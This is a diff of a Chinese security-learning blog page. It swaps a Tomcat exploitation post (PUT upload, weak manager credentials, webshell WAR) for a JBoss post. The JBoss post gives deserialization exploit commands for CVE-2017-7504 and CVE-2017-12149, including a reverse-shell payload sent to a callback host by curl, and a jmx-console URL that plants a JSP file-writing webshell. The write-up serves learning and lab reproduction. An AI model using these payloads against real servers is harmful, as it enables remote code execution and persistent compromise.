@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="中间件安全-tomacat篇, 个人blog,信息安全学习记录,生活,学习">
+    <meta name="keywords" content="中间件安全-jboss篇, 个人blog,信息安全学习记录,生活,学习">
     <meta name="description" content="信息安全学习记录">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>中间件安全-tomacat篇 | EASY</title>
+    <title>中间件安全-jboss篇 | EASY</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/awesome/css/all.css">
@@ -287,12 +287,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/EASY233/picture/img/u=2080030236,4239738931&fm=26&gp=0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200806111922.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">中间件安全-tomacat篇</h1>
+                    <h1 class="description center-align post-title">中间件安全-jboss篇</h1>
                 </div>
             </div>
         </div>
@@ -425,7 +425,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-05
+                    2020-08-06
                 </div>
                 
 
@@ -441,84 +441,38 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Tomcat 是一个开源的轻量级Web 应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p>
-<p>实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
-<h2 id="PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="PUT方法任意写文件漏洞（CVE-2017-12615）"></a>PUT方法任意写文件漏洞（CVE-2017-12615）</h2><blockquote>
-<p>Tomcat版本：8.5.19</p>
-</blockquote>
-<p>漏洞本质Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件：</p>
-<pre><code>&lt;servlet&gt;
-    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
-    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;debug&lt;/param-name&gt;
-        &lt;param-value&gt;0&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;listings&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;init-param&gt;
-        &lt;param-name&gt;readonly&lt;/param-name&gt;
-        &lt;param-value&gt;false&lt;/param-value&gt;
-    &lt;/init-param&gt;
-    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
-&lt;/servlet&gt;</code></pre><p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接使用put方法上传shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/image-20200805153427493.png" alt=""></p>
-<p>访问发现可以成功拿到shell：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/image-20200805153730175.png" alt=""></p>
-<h2 id="Tomcat7-弱口令-amp-amp-后台getshell漏洞"><a href="#Tomcat7-弱口令-amp-amp-后台getshell漏洞" class="headerlink" title="Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞"></a>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</h2><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
-<p>Tomact 支持在后台部署war文件，如果可以通过弱口令进入后台，便可以通过部署恶意的war文件进行getshell。</p>
-<p>但是要访问后台，需要用户有对应的权限，Tomcat7+权限分为：</p>
-<ul>
-<li>manager（后台管理）<ul>
-<li>manager-gui 拥有html页面权限</li>
-<li>manager-status 拥有查看status的权限</li>
-<li>manager-script 拥有text接口的权限，和status权限</li>
-<li>manager-jmx 拥有jmx权限，和status权限</li>
-</ul>
-</li>
-<li>host-manager（虚拟主机管理）<ul>
-<li>admin-gui 拥有html页面权限</li>
-<li>admin-script 拥有text接口权限</li>
-</ul>
-</li>
-</ul>
-<p>这些权限的究竟有什么作用，详情阅读 <a href="http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html" target="_blank" rel="noopener">http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html</a></p>
-<p>在<code>conf/tomcat-users.xml</code>文件中配置用户的权限：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;
-              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
-              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
-              version=&quot;1.0&quot;&gt;
-
-    &lt;role rolename=&quot;manager-gui&quot;/&gt;
-    &lt;role rolename=&quot;manager-script&quot;/&gt;
-    &lt;role rolename=&quot;manager-jmx&quot;/&gt;
-    &lt;role rolename=&quot;manager-status&quot;/&gt;
-    &lt;role rolename=&quot;admin-gui&quot;/&gt;
-    &lt;role rolename=&quot;admin-script&quot;/&gt;
-    &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;
-
-&lt;/tomcat-users&gt;</code></pre><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>tomcat默认后台地址：<a href="http://xx/manager/html" target="_blank" rel="noopener">http://xx/manager/html</a> 使用弱口令tomcat和tomcat进入后台。</p>
-<p>war包制作方法，把jsp文件压缩成zip文件然后改名为war文件上传即可。这里使用的是兵蝎马。访问发现是500错误，但是没有关系这是因为冰蝎没有进行报错处理。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200806093802.png" alt="image-20200806093802043"></p>
-<p>使用冰蝎连接即可：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200806093941.png" alt=""></p>
-<h2 id="文件包含漏洞-CVE-2020-1938"><a href="#文件包含漏洞-CVE-2020-1938" class="headerlink" title="文件包含漏洞(CVE-2020-1938)"></a>文件包含漏洞(CVE-2020-1938)</h2><blockquote>
-<p>影响版本：</p>
-<p>Apache Tomcat 6</p>
-<p>Tomcat 7系列  &lt;7.0.100</p>
-<p>Tomcat 8系列 &lt; 8.5.51</p>
-<p>Tomcat 9 系列 &lt;9.0.31</p>
-</blockquote>
-<p>攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等。 如果目标存在上传文件功能还可以利用这个来进行任意代码执行，可参考文章：<a href="https://blog.csdn.net/SouthWind0/article/details/105147369/" target="_blank" rel="noopener">CVE-2020-1938(RCE利用)</a></p>
-<p>网上有很多检测的poc，这里列举两个：</p>
-<p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
-<p><a href="https://github.com/0nise/CVE-2020-1938" target="_blank" rel="noopener">https://github.com/0nise/CVE-2020-1938</a></p>
-<p>使用第一个poc进行测试：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200806101138.png" alt="image-20200806101138095"></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<h1 id="jboss-4-x反序列化漏洞-CVE-2017-7504"><a href="#jboss-4-x反序列化漏洞-CVE-2017-7504" class="headerlink" title="jboss 4.x反序列化漏洞(CVE-2017-7504)"></a>jboss 4.x反序列化漏洞(CVE-2017-7504)</h1><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
+<p>漏洞影响范围是JBoss AS 4.x及之前版本</p>
+<p>访问：<a href="http://yourip/jbossmq-httpil/HTTPServerILServlet如果显示如下图则可能存在漏洞。" target="_blank" rel="noopener">http://yourip/jbossmq-httpil/HTTPServerILServlet如果显示如下图则可能存在漏洞。</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200806160631.png" alt=""></p>
+<p>可以使用该工具<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar" target="_blank" rel="noopener">DeserializeExploit.jar</a>，直接用该工具执行命令、上传文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200806161722.png" alt=""></p>
+<p>或者使用vulhub官方使用的方法：</p>
+<p>利用工具<a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">JavaDeserH2HC</a>选择一个Gadget：<code>ExampleCommonsCollections1WithHashMap</code>执行命令</p>
+<p>执行以下命令:</p>
+<pre><code>javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
+java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;你要执行的命令&quot;</code></pre><p>执行完成后，将生成一个文件<code>ExampleCommonsCollections1WithHashMap.ser</code>，将该文件作为body发送如下数据包：</p>
+<pre><code>curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser</code></pre><h2 id="JBosS-AS-6-X-反序列化漏洞CVE-2017-12149"><a href="#JBosS-AS-6-X-反序列化漏洞CVE-2017-12149" class="headerlink" title="JBosS AS 6.X 反序列化漏洞CVE-2017-12149)"></a>JBosS AS 6.X 反序列化漏洞CVE-2017-12149)</h2><p>影响版本为jboss5.x-6.x</p>
+<p>访问该页面<a href="http://192.168.92.128:8080/invoker/readonly如果出现如下的500错误页面说明漏洞可能存在：" target="_blank" rel="noopener">http://192.168.92.128:8080/invoker/readonly如果出现如下的500错误页面说明漏洞可能存在：</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200806162946.png" alt=""></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>下载反序列化工具:<a href="http://scan.javasec.cn/java/JavaDeserH2HC.zip" target="_blank" rel="noopener">http://scan.javasec.cn/java/JavaDeserH2HC.zip</a> </p>
+<p>执行命令：</p>
+<pre><code>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 
+java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.124.155:1024(要反弹的主机和端口)
+curl http://192.168.124.128:8080/invoker/readonly --data-binary@ReverseShellCommonsCollectionsHashMap.ser</code></pre><p>成功反弹：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200807105740.png" alt=""></p>
+<h2 id="JMXInvokerServlet-反序列化漏洞"><a href="#JMXInvokerServlet-反序列化漏洞" class="headerlink" title="JMXInvokerServlet 反序列化漏洞"></a>JMXInvokerServlet 反序列化漏洞</h2><p>跟上面的利用方法一样，只是利用路径不一样，这个漏洞利用路径是 /invoker/EJBInvokerServlet</p>
+<p>把路径修改一下payload发送过去即可拿到shell，这里不过过多的演示。</p>
+<h2 id="后台未授权getshell"><a href="#后台未授权getshell" class="headerlink" title="后台未授权getshell"></a>后台未授权getshell</h2><p>在低版本中，默认可以访问Jboss web控制台(<a href="http://127.0.0.1:8080/jmx-console)，无需用户名和密码。" target="_blank" rel="noopener">http://127.0.0.1:8080/jmx-console)，无需用户名和密码。</a></p>
+<p>我们可以通过以下方法getshell</p>
+<h3 id="直接写入"><a href="#直接写入" class="headerlink" title="直接写入"></a>直接写入</h3><p>payload：</p>
+<pre><code>http://ip/jmx-console//HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&amp;argType=boolean&amp;arg4=True</code></pre><p>url中的参数：arg0代表war包的名称，arg1=文件名称，arg2=文件后缀名，arg3=文件内容</p>
+<p>将arg3的值取出来并url解码：</p>
+<pre><code>&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;</code></pre><p>功能是写入文件，f=文件名，t=文件内容</p>
+<p>写入1.jsp文件</p>
+<pre><code>http://ip/August/shell.jsp?f=1.jsp&amp;t=(url编码的jsp木马代码)</code></pre><p>访问1.jsp文件</p>
+<pre><code>http://ip/August/1.jsp</code></pre><p><img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/20200807142819.png" alt=""></p>
 
             </div>
             <hr/>
@@ -544,7 +498,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.easy233.top/2020/08/05/zhong-jian-jian-lou-dong-tomacat-pian/">https://www.easy233.top/2020/08/05/zhong-jian-jian-lou-dong-tomacat-pian/</a>
+                    <a href="https://www.easy233.top/2020/08/06/zhong-jian-jian-an-quan-jboss-pian/">https://www.easy233.top/2020/08/06/zhong-jian-jian-an-quan-jboss-pian/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -751,9 +705,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/08/06/zhong-jian-jian-an-quan-jboss-pian/">
                     <div class="card-image">
@@ -770,9 +725,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -781,6 +736,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -799,20 +755,19 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/05/zhong-jian-jian-an-quan-nginx-pian/">
+                <a href="/2020/08/05/zhong-jian-jian-lou-dong-tomacat-pian/">
                     <div class="card-image">
                         
-                        <img src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1596624924637&di=cead992f4da8038dd530de471de2edbe&imgtype=0&src=http%3A%2F%2Fwww.zzzvc.com%2Fzb_users%2Fupload%2F2020%2F02%2F20200214132745158165806583171.jpg" class="responsive-img" alt="中间件安全-nginx篇">
+                        <img src="https://cdn.jsdelivr.net/gh/EASY233/picture/img/u=2080030236,4239738931&fm=26&gp=0.jpg" class="responsive-img" alt="中间件安全-tomacat篇">
                         
-                        <span class="card-title">中间件安全-nginx篇</span>
+                        <span class="card-title">中间件安全-tomacat篇</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言Nginx 是一款轻量级Web 服务器、 反向代理服务器及电子邮件（IMAP/POP3）代理服务器。
-其特点是 占有内存少， 并发能力强(来自百度)
-Nginx解析漏洞该漏洞与nginx和php的版本无关属于用户配置错误的漏洞。如下是p
+                            前言Tomcat 是一个开源的轻量级Web 应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。
+实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 
                         
                     </div>
                     <div class="publish-info">
